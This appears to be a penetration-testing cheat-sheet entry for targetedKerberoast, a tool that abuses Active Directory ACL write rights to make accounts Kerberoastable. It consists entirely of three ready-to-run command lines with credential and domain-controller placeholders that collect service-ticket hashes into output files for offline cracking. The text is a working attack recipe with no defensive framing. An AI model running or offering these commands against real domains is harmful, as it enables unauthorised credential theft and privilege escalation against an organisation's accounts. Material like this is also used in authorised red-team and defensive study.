# targetedKerberoast — Kerberoast via ACL abuse
targetedKerberoast -u $USER -p $PASSWORD -d $DOMAIN --dc-ip $DC_IP
targetedKerberoast -u $USER -p $PASSWORD -d $DOMAIN --dc-ip $DC_IP -o kerberoast_hashes.txt
targetedKerberoast -v -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -o Kerberoastables.txt
